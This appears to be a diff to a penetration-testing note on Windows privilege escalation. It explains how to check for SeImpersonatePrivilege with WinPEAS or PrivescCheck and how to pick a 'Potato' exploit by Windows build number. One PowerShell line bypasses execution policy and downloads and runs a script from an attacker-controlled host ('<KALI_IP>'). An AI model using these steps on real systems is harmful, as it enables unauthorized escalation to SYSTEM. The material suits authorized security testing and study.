@@ -29,11 +29,47 @@ wmic os get osarchitecture
 
 Depending on the Windows version you discovered in Step 1, select your tool from the **"Potato" family**:
 
-### Option A: Modern Windows (Windows 10/11, Server 2016/2019/2022)
+### 1. WinPEAS (`winPEASx64.exe`)
 
-- **Tool:** **`PrintSpoofer.exe`** or **`GodPotato.exe`**
+When you run WinPEAS on the target host, look directly under the **`Privileges Information`** section:
+
+- It checks `whoami /priv` for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
     
-- **Why:** Older potato exploits rely on the NTLM authentication provider against the BITS service, which Microsoft patched. `PrintSpoofer` leverages the Print Spooler service via named pipes, which is highly reliable on modern operating systems.
+- It cross-references the target’s Windows Build Number and explicitly suggests the optimal Potato variant (e.g., flagging _JuicyPotato_ for older builds vs. _RoguePotato_ / _GodPotato_ for Windows 10 1809+ / Server 2019+).
+    
+
+DOS
+
+```
+winPEASx64.exe quiet cmd privileges
+```
+
+### 2. PrivescCheck (`PrivescCheck.ps1`)
+
+If you prefer a PowerShell-native option that doesn't drop binary files to disk, **PrivescCheck** analyzes the OS version, kernel build, and service pack level alongside user privileges.
+
+PowerShell
+
+```
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/PrivescCheck.ps1'); Invoke-PrivescCheck"
+```
+
+In the output under **`Tokens / Privileges`**, it flags if `SeImpersonate` is enabled and prints the matching Potato tool family for that specific build.
+
+### Quick Rule of Thumb (Manual Check)
+
+If you don't want to run a full scanner, you can determine the right tool in 5 seconds using `ver`:
+
+DOS
+
+```
+C:\> ver
+Microsoft Windows [Version 10.0.10586]
+```
+
+- **Build $< 17763$** (Before Win 10 1809 / Server 2019) $\rightarrow$ **JuicyPotato.exe**
+    
+- **Build $\ge 17763$** (Win 10 1809+, Server 2019/2022) $\rightarrow$ **GodPotato.exe** or **RoguePotato.exe**
 
 ---
 ## GodPotato.exe
